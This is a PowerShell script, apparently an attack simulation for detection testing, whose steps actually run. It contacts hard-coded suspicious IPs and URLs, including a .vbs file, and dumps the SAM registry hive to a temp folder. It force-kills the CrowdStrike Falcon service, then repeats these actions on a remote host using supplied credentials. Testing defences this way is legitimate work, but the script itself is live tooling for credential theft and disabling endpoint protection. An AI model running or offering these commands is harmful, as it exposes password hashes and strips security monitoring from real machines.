param(
    [string]$RemoteIP,
    [string]$RemoteUser,
    [string]$RemotePass,
    [switch]$NoRemote
)

Clear-Host

function Show-Help {
    Write-Host "Script Usage:"
    Write-Host "-------------"
    Write-Host "With Remote Connection:"
    Write-Host ".\script.ps1 -RemoteIP <IP_Address> -RemoteUser <domain\user> -RemotePass <password>"
    Write-Host ""
    Write-Host "Without Remote Connection:"
    Write-Host ".\script.ps1 -NoRemote"
    Write-Host ""
    Write-Host "Note: For RemoteUser parameter:"
    Write-Host "- Domain format: domain\user"
    Write-Host "- Workgroup format: Remote_Hostname\User"
    exit
}

# Check if -NoRemote flag is not present and validate required parameters
if (-not $NoRemote) {
    if (-not $RemoteIP -or -not $RemoteUser -or -not $RemotePass) {
        Write-Host "Error: Missing required parameters!"
        Show-Help
    }

    # Validate RemoteUser format
    if ($RemoteUser -notmatch '^[^\\]+\\[^\\]+$') {
        Write-Host "Error: RemoteUser must be in 'domain\user' or 'Remote_Hostname\User' format!"
        Show-Help
    }
}


# Command 1: 
Write-Host -F green 'Testing connectivity to domains...'
powershell -Command {
    $ErrorActionPreference = 'SilentlyContinue'
	try {
		@('94.156.167.80','27.188.166.17','45.155.249.65') | ForEach-Object {Test-Connection $_ -Count 1 -Quiet} 
	} 
	catch {}
}

# Command 2: 
Write-Host -F green 'Testing URLs Access...'
powershell -Command {
	$ErrorActionPreference = 'SilentlyContinue'
	try {
		@('https://ail.tribunepk.org/dfjhJHG_jdHJGdjk_jkdfJHG/dj_sdjJHsdkjHG_jdf','https://188.172.153.160.host.secureserver.net/Yfte2/aVs151.vbs') | ForEach-Object {Invoke-WebRequest -Uri $_ -UseBasicParsing}
	} 
	catch {}
}

# Command 3:
Write-Host -F green 'Trying to dump SAM...'
powershell -Command {
	$ErrorActionPreference = 'SilentlyContinue'
	try {
		cmd /c 'c:\windows\system32\reg save HKLM\SAM %TEMP%\SAM.hiv /y'
	} 
	catch {}
}


# Command 4:
Write-Host -F green 'Trying to kill CS...'
powershell -Command {
	$ErrorActionPreference = 'SilentlyContinue'
	try {
		Get-Process | Where-Object {$_.Name -eq 'CSFalconService'} | Stop-Process -Force 2>$null
	} 
	catch {}
}


# Command 5:
Write-Host -F green 'Trying to kill CS...'
powershell -Command {
	$ErrorActionPreference = 'SilentlyContinue'
	try {
		Get-Process | Where-Object {$_.Name -eq 'CSFalconService'} | Stop-Process -Force 2>$null
	} 
	catch {}
}


# Remote Commands (when -NoRemote is not present)
if (-not $NoRemote) {
    Write-Host -F green 'Trying to kill Remote CS...'
    Write-Host "Remote Connection Details:"
    Write-Host "-------------------------"
    Write-Host "IP: $RemoteIP"
    Write-Host "User: $RemoteUser"
    Write-Host "Password: [HIDDEN]"
	powershell -Command {
		$ErrorActionPreference = 'SilentlyContinue'
		try {
			$cred = New-Object System.Management.Automation.PSCredential ($RemoteUser, (ConvertTo-SecureString $RemotePass -AsPlainText -Force))
			Invoke-Command -ComputerName $RemoteIP -Credential $cred -ScriptBlock {
                @('94.156.167.80','27.188.166.17','45.155.249.65') | ForEach-Object {Test-Connection $_ -Count 1 -Quiet} 
                @('https://ail.tribunepk.org/dfjhJHG_jdHJGdjk_jkdfJHG/dj_sdjJHsdkjHG_jdf','https://188.172.153.160.host.secureserver.net/Yfte2/aVs151.vbs') | ForEach-Object {Invoke-WebRequest -Uri $_ -UseBasicParsing}
                Get-Process | Where-Object {$_.Name -eq 'CSFalconService'} | Stop-Process -Force 2>$null
            }
		} 
		catch {}
	}	
}

Write-Host -F Red 'Script Ends, Bye.'
